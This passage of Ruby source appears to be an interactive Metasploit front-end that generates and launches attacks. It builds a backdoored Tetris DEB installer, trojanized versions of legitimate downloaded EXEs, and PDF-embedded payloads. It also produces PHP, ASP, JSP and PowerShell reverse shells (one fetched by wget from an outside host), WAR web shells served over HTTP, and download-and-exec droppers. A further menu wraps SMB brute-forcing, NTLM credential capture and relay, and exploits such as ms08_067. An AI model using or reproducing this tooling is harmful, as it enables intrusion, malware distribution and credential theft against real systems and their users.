                                    File.rename('/tmp/nothing2seehere/evil_base', "/tmp/nothing2seehere/build/usr/games/not_tetris") #move our payload into position
                                    puts "Building Final Backdoored DEB Package....."
                                    Dir.chdir('/tmp/nothing2seehere/build/DEBIAN') do
                                            system('dpkg-deb --build /tmp/nothing2seehere/build/')
                                    end
     
                                    puts "Running cleanup....."
                                    puts "Removing all temp files......"
                                    FileUtils.cp('/tmp/nothing2seehere/build.deb', "#{Dir.pwd}/#{type}-evil_tetris.deb")
                                    FileUtils.rm_r('/tmp/nothing2seehere/')
                                    cls
                                    banner
                                    puts
                                    puts "Backdoored DEB Game Installer Package for Tint (This is Not Tetris) is ready to go!"
                                    puts "You can find it here: #{Dir.pwd}/evil_tetris.deb"
                                    puts "May the SE Force be with you....."
                                    puts
                                    puts
                                    payload_builder
                            when '2'
                                    puts "What IP to use for Web Based Reverse Payload: "
                                    zIP=gets.chomp
                                    puts
                                    puts "What PORT to use for Web Based Reverse Payload: "
                                    zPORT=gets.chomp
                                    puts
                                    while(true)
                                            puts "Select Payload: "
                                            puts "1) MSF php/meterpreter_reverse_tcp"
                                            puts "2) MSF php/meterpreter/reverse_tcp (staged)"
                                            puts "3) Pentestmonkey's PHP Reverse Shell"
                                            puts "4) MSF ASP Embedded: windows/meterpreter/reverse_tcp"
                                            puts "5) MSF ASP Embedded: windows/x64/meterpreter/reverse_tcp"
                                            puts "6) MSF JSP WebShell: java/jsp_shell_reverse_tcp"
                                            answer=gets.chomp
                                            puts
                                            if answer.to_i > 0 and answer.to_i <= 6 #Ensure a valid option was selected or loopback
                                                    if answer.to_i == 1
                                                            payload='php/meterpreter_reverse_tcp'
                                                    elsif answer.to_i == 2
                                                            payload='php/meterpreter/reverse_tcp'
                                                    elsif answer.to_i == 3
                                                            puts "Grabbing Pentestmonkey PHP Shell & applying a few edits real quick...."
                                                            system('wget http://inf0rm3r.webuda.com/scripts/php-reverse.tar.gz 2> /dev/null; tar xf php-reverse.tar.gz; rm -f php-reverse.tar.gz')
                                                            base=File.open('php-reverse.php').read
                                                            FileUtils.rm('php-reverse.php')
                                                            new=base.sub('$ip = $argv[1];', "$ip = '#{zIP}';").sub('$port = $argv[2];', "$port = #{zPORT.to_i};")
                                                            f=File.open("#{Dir.pwd}/evil_payload.php", 'w')
                                                            f.puts new
                                                            f.close
                                                            final_payload="#{Dir.pwd}/evil_payload.php"
                                                    elsif answer.to_i == 4
                                                            payload='windows/meterpreter/reverse_tcp'
                                                    elsif answer.to_i == 5
                                                            payload='windows/x64/meterpreter/reverse_tcp'
                                                    elsif answer.to_i == 6
                                                            payload='java/jsp_shell_reverse_tcp'
                                                    end
                                                    break
                                            end
                                    end
                                    if answer.to_i > 0 and answer.to_i < 3 #MSF Derived PHP Payloads
                                            puts "Base64 Encode our Payload (Y/N)?"
                                            answer=gets.chomp
                                            puts
                                            if answer == 'Y' or answer == 'YES'
                                                    str=' -e php/base64 -i 15'
                                            else
                                                    str=''
                                            end
                                            puts "Creating Base Payload using #{payload} LHOST=#{zIP} LPORT=#{zPORT}......"
                                            system("#{MSFPATH}/msfvenom -p #{payload} LHOST=#{zIP} LPORT=#{zPORT}#{str} -f raw > #{Dir.pwd}/evil_payload.p")
                                            start='<?php '
                                            middle=File.open("#{Dir.pwd}/evil_payload.p").read
                                            FileUtils.rm("#{Dir.pwd}/evil_payload.p")
                                            ender=' ?>'
                                            f=File.open("#{Dir.pwd}/evil_payload.php", 'w')
                                            f.puts start + middle + ender
                                            f.close
                                            final_payload="#{Dir.pwd}/evil_payload.php"
                                    end
     
                                    if answer.to_i == 4 or answer.to_i == 5 #MSF Derived PHP Payloads
                                            puts "Try to Encode Payload (Y/N)?"
                                            answer=gets.chomp
                                            puts
                                            if answer == 'Y' or answer == 'YES'
                                                    if payload =~ /x64/
                                                            str=' -e x64/xor -i 10 -a 64'
                                                    else
                                                            str=' -e x86/shikata_ga_nai -i 10'
                                                    end
                                            else
                                                    str=''
                                            end
                                            puts "Creating Payload using #{payload} LHOST=#{zIP} LPORT=#{zPORT}......"
                                            system("#{MSFPATH}/msfvenom -p #{payload} LHOST=#{zIP} LPORT=#{zPORT}#{str} -f asp > #{Dir.pwd}/evil_payload.asp")
                                            final_payload="#{Dir.pwd}/evil_payload.asp"
                                    end
                                    if answer.to_i == 6 #MSF JSP Payload
                                            puts "Creating Payload using #{payload} LHOST=#{zIP} LPORT=#{zPORT}......"
                                            system("#{MSFPATH}/msfvenom -p #{payload} LHOST=#{zIP} LPORT=#{zPORT}#{str} -f raw > #{Dir.pwd}/evil_payload.jsp")
                                            final_payload="#{Dir.pwd}/evil_payload.jsp"
                                    end
     
                                    sleep(2)
                                    puts "Web Payload is ready to go!"
                                    puts "You can find it here: #{final_payload}"
                                    puts "May the Force be with you....."
                                    puts
                                    puts
                                    payload_builder
                            when '3'
                                    puts "What IP to use for Winblows Reverse Payload: "
                                    zIP=gets.chomp
                                    puts
                                    puts "What PORT to use for Winblows Reverse Payload: "
                                    zPORT=gets.chomp
                                    puts
     
                                    winz = { '1' => 'windows/meterpreter/reverse_tcp', '2' => 'windows/shell/reverse_tcp', '3' => 'windows/x64/meterpreter/reverse_tcp', '4' => 'windows/x64/shell/reverse_tcp' }
                                    while(true)
                                            puts "Select Payload: "
                                            winz.each {|x,y| puts "#{x}) #{y}" }
                                            answer=gets.chomp
                                            puts
                                            if answer.to_i > 0 and answer.to_i <= 4
                                                    payload=winz["#{answer.to_i}"]
                                                    break
                                            end
                                    end
     
                                    while(true)
                                            puts "Select Option: "
                                            puts "1) Backdoor User Provided EXE"
                                            puts "2) Use one of the Built-In EXE Options"
                                            answer=gets.chomp
                                            puts
                                            if answer == '1'
                                                    puts "Please provide path to EXE: "
                                                    user_exe=gets.chomp
                                                    puts
                                                    if File.exists?(user_exe)
                                                            FileUtils.cp(user_exe, "#{Dir.pwd}/safe.exe") unless user_exe == "#{Dir.pwd}/safe.exe"
                                                            exe="#{Dir.pwd}/safe.exe"
                                                            break
                                                    else
                                                            puts "Can't seem to find the provided file!"
                                                            puts "Check the path or permissions and try again....\n\n"
                                                    end
                                            elsif answer == '2'
                                                    good_exe=[ "http://download.oldapps.com/AIM/aim75119.exe", "http://download.oldapps.com/UTorrent/utorrent_3.3_29609.exe", "http://audacity.googlecode.com/files/audacity-win-2.0.3.exe", "https://s3.amazonaws.com/MinecraftDownload/launcher/Minecraft_Server.exe", "http://www.wingrep.com/resources/binaries/WindowsGrep23.exe" ] #Random manuals from the net, mostly tech related....
    #                                               exe_base = good_exe[rand(4)] #Pick one at random
                                                    exe_base = good_exe[0] #Pick one at random
                                                    puts "Grabbing latest version of EXE, one sec......"
                                                    system("wget #{exe_base} -O #{Dir.pwd}/safe.exe 2> /dev/null")
                                                    exe="#{Dir.pwd}/safe.exe"
                                                    break
                                            else
                                                    puts "Pick a valid option dummy!\n\n"
                                            end
                                    end
     
                                    puts "Do you want to apply basic encoding to payload (Y/N)?"
                                    answer=gets.chomp
                                    puts
                                    puts "Generating payload with #{payload} LHOST=#{zIP} LPORT=#{zPORT}, hang tight a sec....."
                                    if answer.upcase == 'N' or answer.upcase == 'NO'
                                            system("#{MSFPATH}/msfvenom -p #{payload} LHOST=#{zIP} LPORT=#{zPORT} -f exe -x #{exe} > #{Dir.pwd}/evil_payload.exe")
                                    else
                                            if payload =~ /x64/
                                                    system("#{MSFPATH}/msfvenom -p #{payload} LHOST=#{zIP} LPORT=#{zPORT} -e x64/xor -b \\x00 -i 10 -a 64 -f exe -x #{exe} > #{Dir.pwd}/evil_payload.exe")
                                            else
                                                    system("#{MSFPATH}/msfvenom -p #{payload} LHOST=#{zIP} LPORT=#{zPORT} --platform windows --arch x86 -e x86/shikata_ga_nai -b \\x00 -i 10 -f exe -x #{exe} > #{Dir.pwd}/evil_payload.exe")
                                            end
                                    end
     
                                    sleep(2)
                                    cls
                                    banner
                                    puts
                                    puts "Your EXE Payload is ready to go!"
                                    puts "You can find it here: #{Dir.pwd}/evil_payload.exe"
                                    puts "May the SE Force be with you....."
                                    puts
                                    puts
                                    payload_builder
                            when '4'
                                    puts "What IP to use for Embedded PDF Reverse Payload: "
                                    zIP=gets.chomp
                                    puts
                                    puts "What PORT to use for Embedded PDF Reverse Payload: "
                                    zPORT=gets.chomp
                                    puts
     
                                    while(true)
                                            puts "Select Option: "
                                            puts "1) Custom User Provided PDF"
                                            puts "2) Use one of the Built-In PDF Options"
                                            answer=gets.chomp
                                            puts
                                            if answer == '1'
                                                    puts "Please provide path to PDF: "
                                                    user_pdf=gets.chomp
                                                    puts
                                                    if File.exists?(user_pdf)
                                                            FileUtils.cp(user_pdf, "#{Dir.pwd}/safe.pdf") unless user_pdf == "#{Dir.pwd}/safe.pdf"
                                                            pdf="#{Dir.pwd}/safe.pdf"
                                                            break
                                                    else
                                                            puts "Can't seem to find the provided file!"
                                                            puts "Check the path or permissions and try again....\n\n"
                                                    end
                                            elsif answer == '2'
                                            good_pdf=[ "http://www.apache.org/dist/httpd/docs/httpd-docs-2.0.63.en.pdf", "http://downloads.mysql.com/docs/refman-5.6-en.pdf", "http://www.poul.org/wp-content/uploads/2011/11/nginx.pdf", "http://livedocs.adobe.com/coldfusion/8/configuring.pdf", "http://www.cse.psu.edu/~mcdaniel/cse598i-s10/docs/ZendFramework-Tutorial.pdf" ] #Random manuals from the net, msotly tech related....
                                                    pdf_base = good_pdf[rand(4)] #Pick one at random
                                                    puts "Grabbing latest version of PDF manual, one sec......"
                                                    system("wget #{pdf_base} -O #{Dir.pwd}/safe.pdf 2> /dev/null")
                                                    pdf="#{Dir.pwd}/safe.pdf"
                                                    break
                                            else
                                                    puts "Pick a valid option dummy!\n\n"
                                            end
                                    end
     
                                    winz = { '1' => 'windows/meterpreter/reverse_tcp', '2' => 'windows/x64/meterpreter/reverse_tcp', '3' => 'windows/shell/reverse_tcp', '4' => 'windows/x64/shell/reverse_tcp' }
     
                                    while(true)
                                            puts "Select Payload: "
                                            winz.each {|x,y| puts "#{x}) #{y}" }
                                            answer=gets.chomp
                                            puts
                                            if answer.to_i > 0 and answer.to_i <= 4
                                                    payload=winz["#{answer.to_i}"]
                                                    break
                                            end
                                    end
     
                                    puts "Generating payload with #{payload} LHOST=#{zIP} LPORT=#{zPORT}, hang tight a sec....."
                                    system("#{MSFPATH}/msfcli exploit/windows/fileformat/adobe_pdf_embedded_exe FILENAME=evil_payload.pdf INFILENAME=#{Dir.pwd}/safe.pdf PAYLOAD=#{payload} LHOST=#{zIP} LPORT=#{zPORT} E")
                                    FileUtils.mv("#{Dir.home}/.msf4/local/evil_payload.pdf", "#{Dir.pwd}/evil_payload.pdf") #Evil Embedded Payload Done!
     
    #                               FileUtils.rm("#{Dir.pwd}/safe.pdf") #Uncomment this line if you want to enable cleanup of original PDF
     
                                    sleep(2)
                                    cls
                                    banner
                                    puts
                                    puts "PDF Payload is ready to go!"
                                    puts "You can find it here: #{Dir.pwd}/evil_payload.pdf"
                                    puts "May the SE Force be with you....."
                                    puts
                                    puts
                                    payload_builder
                            when '5'
                                    puts "Provide Filename to Save & Run as on Target: "
                                    zNAME=gets.chomp
                                    puts
     
                                    puts "Please provide (pre-encoded) URL to the executable to download & run: "
                                    zSITE=gets.chomp
                                    puts
     
                                    puts "Generating payload with #{payload} EXE=#{zNAME} URL=#{zSITE}, hang tight a sec....."
                                    system("#{MSFPATH}/msfvenom -p windows/download_exec EXE=#{zNAME} URL=#{zSITE} -f exe > #{Dir.pwd}/downNexec.exe")
     
                                    sleep(2)
                                    puts
                                    puts "Windows Download & Exec Payload is ready to go!"
                                    puts "You can find it here: #{Dir.pwd}/evil_downNexec.exe"
                                    puts "May the SE Force be with you....."
                                    puts
                                    puts
                                    payload_builder
                            when '6'
                                    puts "What IP to use for Winblows PowerShell Reverse Payload: "
                                    zIP=gets.chomp
                                    puts
                                    puts "What PORT to use for Winblows PowerShell Reverse Payload: "
                                    zPORT=gets.chomp
                                    puts
     
                                    winz = { '1' => 'windows/meterpreter/reverse_tcp', '2' => 'windows/shell/reverse_tcp', '3' => 'windows/x64/meterpreter/reverse_tcp', '4' => 'windows/x64/shell/reverse_tcp' }
                                    while(true)
                                            puts "Select Payload: "
                                            winz.each {|x,y| puts "#{x}) #{y}" }
                                            answer=gets.chomp
                                            puts
                                            if answer.to_i > 0 and answer.to_i <= 4
                                                    payload=winz["#{answer.to_i}"]
                                                    break
                                            end
                                    end
     
     
                                    puts "Generating Base ShellCode for Payload....."
                                    #Preps and Builds our PowerShell Command to run our payload in memory upon execution on target.....
                                    ps_cmd = powershell_builder("-p #{payload} LHOST=#{zIP} LPORT=#{zPORT}")
     
                                    puts
                                    puts "Select output format: "
                                    puts "1) Batch File (.bat)"
                                    puts "2) VBScript File (.vbs)"
                                    answer=gets.chomp
                                    if answer == '2'
                                            final_payload="#{Dir.pwd}/evil_PowerShell.vbs"
                                    else
                                            final_payload="#{Dir.pwd}/evil_PowerShell.bat"
                                    end
     
                                    f=File.open(final_payload, 'w')
                                    if final_payload =~ /\.bat/
                                            f.puts "@echo off"
                                            f.puts ps_cmd
                                    elsif final_payload =~ /\.vbs/
                                            f.puts "Set objShell = CreateObject(\"Wscript.shell\")"
                                            f.puts ""
                                            f.puts "objShell.exec(\"#{ps_cmd}\")"
                                    end
                                    f.close
     
                                    sleep(2)
                                    puts
                                    puts "Windows PowerShell Payload is ready to go!"
                                    puts "You can find it here: #{final_payload}"
                                    puts "May the Force be with you....."
                                    puts
                                    puts
                                    payload_builder
                            when '7'
                                    if Dir.exists?("#{TMP}/warbuilder")
                                            FileUtils.rm_r("#{TMP}/warbuilder")
                                            Dir.mkdir("#{TMP}/warbuilder")
                                    else
                                            Dir.mkdir("#{TMP}/warbuilder")
                                    end
                                    while(true)
                                            puts "Select Option: "
                                            puts "1) Build WAR with Simple JSP CMD Exec Web Shell"
                                            puts "2) Build WAR with Metasploit Reverse Shell"
                                            puts "3) Build WAR with Metasploit Bind Shell"
                                            answer=gets.chomp
                                            puts
                                            if answer.to_i > 0 and answer.to_i <= 3
                                                    if answer.to_i == 2
                                                            puts "What IP to use for JSP Reverse Payload: "
                                                            zIP=gets.chomp
                                                            puts
                                                            puts "What PORT to use for JSP Reverse Payload: "
                                                            zPORT=gets.chomp
                                                            puts
                                                            reverse_jsp_shell(zIP, zPORT)
                                                    elsif answer.to_i == 3
                                                            puts "What PORT to use for JSP Bind Payload: "
                                                            zPORT=gets.chomp
                                                            puts
                                                            bind_jsp_shell(zPORT)
                                                    else
                                                            simple_jsp_shell
                                                    end
                                                    break
                                            else
                                                    "Please select a valid option!\n\n"
                                            end
                                    end
                                    inf_build
                                    puts "Generating WAR Archive with payload......"
                                    Dir.chdir("#{TMP}/warbuilder/") {
                                            system("jar cvf pwnsauce.war WEB-INF/ cmd.jsp")
                                    }
                                    if answer.to_i == 2
                                            final="#{Dir.pwd}/pwnsauce_rev.war"
                                    elsif answer.to_i == 3
                                            final="#{Dir.pwd}/pwnsauce_bind.war"
                                    else
                                            final="#{Dir.pwd}/pwnsauce.war"
                                    end
                                    FileUtils.mv("#{TMP}/warbuilder/pwnsauce.war", final)
                                    sleep(2)
                                    puts
                                    puts "Web Archive (WAR) Payload is ready to go!"
                                    puts
                                    puts "Do you want to create HTTP Server to make available for download (Y/N)?"
                                    answer=gets.chomp
                                    puts
                                    if answer.upcase == 'Y' or answer.upcase == 'YES'
                                            if Dir.exists?("#{TMP}/warbuilder/downloads")
                                                    FileUtils.rm_r("#{TMP}/warbuilder/downloads")
                                                    Dir.mkdir("#{TMP}/warbuilder/downloads")
                                            else
                                                    Dir.mkdir("#{TMP}/warbuilder/downloads")
                                            end
                                            FileUtils.cp(final, "#{TMP}/warbuilder/downloads/")
                                            zROOT="#{TMP}/warbuilder/downloads/"
     
                                            include WEBrick    # let's import the namespace so we don't have to keep typing 'WEBrick::' everywhere
     
                                            puts "What PORT to use for Temporary HTTP Server: "
                                            zPORT=gets.chomp
                                            puts
     
                                            puts "Starting up temporary HTTP Server on: 0.0.0.0:#{zPORT}"
                                            puts "Use 'CTRL+C' to Stop the HTTP Server when done!"
                                            puts
                                            server = WEBrick::HTTPServer.new :Port => zPORT, :DocumentRoot => zROOT
                                            trap("INT") { puts "\nSYSTEM INTERUPT RECEIVED!\nShutting Down Temporary HTTP Server......\n.............\n........\n.....\n...\n.\n"; server.shutdown }
                                            server.start
                                            puts
                                            puts "OK HTTP Server stopped, You can find the evil WAR archive we originally created here: #{final}"
                                            puts "May the Force be with you....."
                                    else
                                            puts "OK, You can find the evil WAR archive here: #{final}"
                                            puts "May the Force be with you....."
                                    end
                                    FileUtils.rm_r("#{TMP}/warbuilder/")
                                    puts
                                    puts
                                    payload_builder
                            else
                                    cls
                                    banner
                                    puts
                                    puts "Oops, Didn't quite understand that one!"
                                    puts "Please try again....."
                                    puts
                                    payload_builder
                    end
            end
    end
     
    #keipmx wrapper
    def keimpx_wrapper
            while(true)
                    puts "Select Targeting Method: "
                    puts "1) Single IP/Range"
                    puts "2) List with Targets"
                    answer=gets.chomp
                    puts
                    if answer == '1'
                            puts "Please Provide Target IP: "
                            t=gets.chomp
                            zIP="-t #{t}"
                            puts
                            break
                    elsif answer == '2'
                            puts "Please Provide Target List: "
                            dfile=gets.chomp
                            puts
                            if File.exists?(dfile)
                                    zIP="-l #{dfile}"
                                    puts
                                    break
                            else
                                    puts "Can't seem to find provided target list!"
                                    puts "Check the permissions or the path and try again....."
                                    puts
                            end
                    end
            end
     
            while(true)
                    puts "Select Credentials Method: "
                    puts "1) Known Username & Password Plaintext"
                    puts "2) Known Username & Password Hash"
                    puts "3) List File with Known Credentials (Hashdump)"
                    answer=gets.chomp
                    puts
                    if answer == '1'
                            puts "Provide Username: "
                            zUSER=gets.chomp
                            puts
                            puts "Provide Password: "
                            zPASS=gets.chomp
                            puts
                            zCREDS="-U #{zUSER} -P #{zPASS}"
                            break
                    elsif answer == '2'
                            puts "Provide Username: "
                            zUSER=gets.chomp
                            puts
                            puts "Provide LM Hash: "
                            zLM=gets.chomp
                            puts
                            puts "Provide NT Hash: "
                            zNT=gets.chomp
                            puts
                            zCREDS="-U #{zUSER} --lm=#{zLM} --nt=#{zNT}"
                            break
                    elsif answer == '3'
                            puts "Please Provide Credentials File: "
                            dfile=gets.chomp
                            puts
                            if File.exists?(dfile)
                                    zCREDS="-c #{dfile}"
                                    puts
                                    break
                            end
                    end
            end
     
            puts "Include Domain info (Y/N)?"
            answer=gets.chomp
            puts
            if answer.upcase == 'Y' or answer.upcase == 'YES'
                    puts "1) Single Domain"
                    puts "2) List of Domains"
                    answer=gets.chomp
                    puts
                    if answer == '2'
                            puts "Provide Domain List File: "
                            domfile=gets.chomp
                            puts
                            if File.exists?(domfile)
                                    zDomain=" -d #{domfile}"
                            else
                                    puts "Can't find the provided Domain list file!"
                                    puts "Check the permissions or the path and try again, moving forward with out it...."
                                    zDomain=''
                            end
                    else
                            puts "Provide Domain: "
                            dom=gets.chomp
                            puts
                            zDomain=" -D #{dom}"
                    end
            else
                    zDomain=''
            end
     
            puts "Select Port: "
            puts "1) 445 (Default)"
            puts "2) 139"
            answer=gets.chomp
            if answer == '2'
                    zPORT=' -p 139'
            else
                    zPORT=' '
            end
     
            puts "Launching KEIMPX in new window, hang tight....."
            k = "#{KEIMPX}/keimpx.py #{zIP} #{zCREDS}#{zPORT}#{zDomain}"
            keimpx="xterm -title 'KEIMPX #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{k}'\""
            fireNforget(keimpx)
            puts
            @xcount = @xcount.to_i + 1
            cls
            banner
    end
     
    #Exploit Builder
    def exploit_builder
            puts "Please select option to run: "
            puts "c)  Clear Terminal"
            puts "b)  Back to Main Menu"
            puts "x)  Exit Completely"
            puts "k)  Keimpx SMB Tool"
            puts "0)  ARP Discovery Scanner"
            puts "1)  SMB Version Scanner"
            puts "2)  SMB Login Scanner"
            puts "3)  SMB Session Pipe Auditor"
            puts "4)  SMB Share Enumeration"
            puts "5)  SMB Domain User Enumeration"
            puts "6)  Exploit Windows ms08_067 (netapi)"
            puts "7)  Exploit Samba trans2open (*nix: Samba versions 2.2.0 to 2.2.8)"
            puts "8)  Exploit Samba 'username map script' (*nix: Samba versions 3.0.20 through 3.0.25rc3)"
            puts "9)  Windows SMB Relay Exploit"
            puts "10) NetBIOS Name Service Spoofer (nbns_spoofer)"
            puts "11) HTTP Client MS Credential Catcher (http_ntlm)"
            puts "12) SMB Authentication Capture Server"
            puts "13) MS-SQL Server NTLM Stealer"
            puts "14) MS-SQL Server NTLM Stealer via SQLi"
            puts "15) MS-SQL Server Payload Execution (Credentials)"
            puts "16) MS-SQL Server Payload Execution (via SQLi)"
            puts "17) PostgreSQL for Windows Payload Execution (Credentials)"
            puts "18) PostgreSQL for Linux Payload Execution (Credentials)"
            puts "19) Oracle MySQL for Microsoft Windows UDF Payload Execution"
            puts "20) Oracle MySQL for Microsoft Windows MOF Payload Execution"
            puts
     
            prompt = "(Exploit Assistant)> "
            while line = Readline.readline("#{prompt}", true)
                    cmd = line.chomp
                    case cmd
                            when /^c$|^clear$/i
                                    cls
                                    banner
                                    exploit_builder
                            when /^back$|^b$/i
                                    cls
                                    banner
                                    main_menu
                            when /^exit$|^quit$|^x$/i
                                    puts
                                    puts "OK, exiting now...."
                                    if File.exists?("#{Dir.pwd}/msfassist.rc") then FileUtils.rm("#{Dir.pwd}/msfassist.rc") end;
                                    puts
                                    exit 69;
                            when /^k$|^keimpx$/i
                                    puts
                                    if File.exists?("#{KEIMPX}/keimpx.py")
                                            keimpx_wrapper
                                    else
                                            puts "Can't seem to find KEIMPX to run it!"
                                            puts "Check the permissions or path provided in source and try again (path: #{KEIMPX})"
                                            puts "If need to install, try this: git clone https://github.com/inquisb/keimpx.git"
                                    end
                                    puts
                                    exploit_builder
                            when '0'
                                    puts "ARP Discovery Scanner"
                                    puts "Target IP: "
                                    zIP=gets.chomp
                                    puts
     
                                    puts "Source IP to use in requests: "
                                    sIP=gets.chomp
                                    puts
     
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts 'use auxiliary/scanner/discovery/arp_sweep'
                                    f.puts "set RHOSTS #{zIP}"
                                    f.puts "set SHOST #{sIP}"
                                    f.puts 'set SMAC 00:11:22:AA:BB:CC'
                                    f.puts "set THREADS 10"
                                    f.puts 'run'
                                    f.close
     
                                    arp="xterm -title 'MSF SMB Relay Exploit #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(arp)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '1'
                                    puts "SMB Version Detection"
                                    puts "Target IP: "
                                    zIP=gets.chomp
                                    puts
                                    puts "Launching MSF SMB Version Scanner against #{zIP} in a new x-window....."
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts 'use auxiliary/scanner/smb/smb_version'
                                    f.puts "set RHOSTS #{zIP}"
                                    f.puts "set THREADS 5"
                                    f.puts 'run'
                                    f.close
                                    smb_version="xterm -title 'MSF SMB Version Scanner #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(smb_version)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '2'
                                    puts "SMB Login Check Scanner"
                                    puts "Target IP: "
                                    zIP=gets.chomp
                                    puts
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts "use auxiliary/scanner/smb/smb_login"
                                    f.puts "set RHOSTS #{zIP}"
                                    done=0
                                    while(true)
                                            puts "Select how to Scan for SMB Logins: "
                                            puts "1) Single User/Pass Combo across IP"
                                            puts "2) User & Password Files for Bruteforce Scanning IP"
                                            answer=gets.chomp
                                            if answer.to_i == 1
                                                    puts "Please provide Username: "
                                                    smbUser=gets.chomp
                                                    puts
                                                    puts "Please provide Password: "
                                                    smbPass=gets.chomp
                                                    puts
     
                                                    f.puts "set SMBUser #{smbUser}"
                                                    f.puts "set SMBPass #{smbPass}"
                                                    done=1
                                                    break
                                            elsif answer.to_i == 2
                                                    while(true)
                                                            puts "Location of Password File to use: "
                                                            passfile=gets.chomp
                                                            puts
                                                            if File.exists?(passfile)
                                                                    break
                                                            else
                                                                    puts "Can't find file, please check path or permissions and try again....\n\n"
                                                            end
                                                    end
                                                    while(true)
                                                            puts "Location of Username File to use: "
                                                            userfile=gets.chomp
                                                            puts
                                                            if File.exists?(userfile)
                                                                    break
                                                            else
                                                                    puts "Can't find file, please check path or permissions and try again....\n\n"
                                                            end
                                                    end
     
                                                    f.puts "set PASS_FILE #{passfile}"
                                                    f.puts "set USERPASS_FILE #{userfile}"
                                                    done=1
                                                    break
                                            else
                                                    puts "Please choose a valid option!"
                                            end
                                            if done.to_i > 0
                                                    puts "Do you want to try blank passwords (Y/N)?"
                                                    answer=gets.chomp
                                                    if answer.upcase == 'N' or answer.upcase == 'NO'
                                                            f.puts "set BLANK_PASSWORDS false"
                                                    end
     
                                                    puts "Do you want to try username as passwords (Y/N)?"
                                                    answer=gets.chomp
                                                    if answer.upcase == 'N' or answer.upcase == 'NO'
                                                            f.puts "set USER_AS_PASS false"
                                                    end
                                                    break
                                            end
                                    end
                                    puts "Launching MSF SMB Login Scanner against #{zIP} in a new x-window....."
                                    f.puts "set THREADS 5"
                                    f.puts 'run'
                                    f.close
                                    smb_version="xterm -title 'MSF SMB Login Scanner #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(smb_version)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '3'
                                    puts "SMB Session Pipe Auditor"
                                    puts "Target IP: "
                                    zIP=gets.chomp
                                    puts
                                    puts "Launching MSF SMB Session Pipe Auditor against #{zIP} in a new x-window....."
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts 'use auxiliary/scanner/smb/pipe_auditor'
                                    f.puts "set RHOSTS #{zIP}"
                                    f.puts 'run'
                                    f.close
                                    smb_version="xterm -title 'MSF Listener #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(smb_version)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '4'
                                    puts "SMB Share Enumeration"
                                    puts "Target IP: "
                                    zIP=gets.chomp
                                    puts
     
                                    puts "Please provide Username: "
                                    smbUser=gets.chomp
                                    puts
     
                                    puts "Please provide Password: "
                                    smbPass=gets.chomp
                                    puts
     
                                    puts "Launching MSF Share Enumeration Scanner against #{zIP} in a new x-window....."
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts 'use auxiliary/scanner/smb/smb_enumshares'
                                    f.puts "set RHOSTS #{zIP}"
                                    f.puts "set SMBUser #{smbUser}"
                                    f.puts "set SMBPass #{smbPass}"
                                    f.puts "set THREADS 5"
                                    f.puts 'run'
                                    f.close
                                    smb_version="xterm -title 'MSF Listener #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(smb_version)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '5'
                                    puts "SMB Domain User Enumeration"
                                    puts "Provide Target IP: "
                                    zIP=gets.chomp
     
                                    puts "Please provide Username: "
                                    smbUser=gets.chomp
                                    puts
     
                                    puts "Please provide Password: "
                                    smbPass=gets.chomp
                                    puts
     
                                    puts "Launching Domain User Enumeration Scanner against #{zIP} in a new x-window....."
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts 'use auxiliary/scanner/smb/smb_enumusers_domain'
                                    f.puts "set RHOSTS #{zIP}"
                                    f.puts "set SMBUser #{smbUser}"
                                    f.puts "set SMBPass #{smbPass}"
                                    f.puts "set THREADS 5"
                                    f.puts 'run'
                                    f.close
                                    smb_version="xterm -title 'MSF Listener #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(smb_version)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '6'
                                    puts "Exploit ms08_067 (netapi) Winblows Vulnerability"
                                    puts "Provide Target IP: "
                                    zIP=gets.chomp
                                    puts
                                    payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
                                    if payload =~ /bind/
                                            puts "Please provide PORT for Bind Shell: "
                                    else
                                            puts "Please provide PORT to listen on: "
                                    end
                                    zport=gets.chomp
                                    puts
     
                                    puts "Launching Exploit for ms08_067 (netapi) against #{zIP} in a new x-window....."
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts "use exploit/windows/smb/ms08_067_netapi"
                                    f.puts "set RHOST #{zIP}"
                                    f.puts "set PAYLOAD #{payload}"
                                    f.puts "set LHOST 0.0.0.0"
                                    f.puts "set LPORT #{zport}"
